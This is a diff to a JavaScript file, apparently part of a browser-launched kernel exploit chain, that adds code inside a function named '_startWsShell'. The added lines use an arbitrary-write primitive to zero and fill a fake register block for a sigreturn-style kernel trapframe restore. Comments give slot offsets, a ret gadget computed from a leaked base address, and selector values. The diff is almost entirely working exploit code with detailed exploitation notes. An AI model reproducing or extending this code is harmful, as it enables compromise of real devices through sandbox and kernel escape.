@@ -5582,6 +5582,27 @@ function _startWsShell(){
              * the scope, the pure reader-class install test. */
             var retGadget=S.BASE+0x4001750n;
             reply.retGadget='0x'+retGadget.toString(16);
+            /* THE GPR BLOCK (srop36): the kernel bcopy(user+0x48 -> tf,
+             * 0x90) restores the FULL register file - 18 qwords - and the
+             * surgical design left them as the scope's spray garbage = the
+             * resume at the ret gadget continues the trampoline with
+             * garbage registers. THE SLOT ORDER (validated by the 814a
+             * capture: +0x88=RBP=0x7efb3a890 a STACK address, +0x48=RDI=
+             * the capture buffer itself): rdi+0x48, rsi+0x50, rdx+0x58,
+             * rcx+0x60, r8+0x68, r9+0x70, rax+0x78, rbx+0x80, rbp+0x88,
+             * r10+0x90, r11+0x98, r12+0xA0, r13+0xA8, r14+0xB0, r15+0xB8.
+             * OUR KNOWN VALUES: RDI=CAP (the scope - the trampoline's live
+             * rdi at the call), RBP=cfr (the trampoline's frame pointer).
+             * The caller-saved (rsi/rdx/rcx/r8/r9/rax) are reloaded by the
+             * caller after any call = zero-tolerant; the callee-saved
+             * (rbx/r10-r15) = the trampoline's live values - unknowable
+             * from JS (the frame slots hold the CALLER's pushed values) -
+             * ZEROED as the test. THE TUNED FAKE SCOPE IS ZEROS at
+             * +0x48-0xC0 (the preflight proves the trampoline tolerates
+             * zeros) = the writes change nothing pre-call. */
+            for(var gW=0x48;gW<0xD8;gW+=8)S.absWrite(CAP+BigInt(gW),0n);
+            S.absWrite(CAP+0x048n,CAP);   /* RDI = the scope (the live value) */
+            S.absWrite(CAP+0x088n,cfrS);  /* RBP = the trampoline's frame ptr */
             S.absWrite(CAP+0x0C0n,0x1B001300000000n);  /* the 814a fs/gs selectors */
             S.absWrite(CAP+0x0C8n,0n);
             S.absWrite(CAP+0x0D0n,0n);                 /* the D0 gate (<8, the 814b shape) */
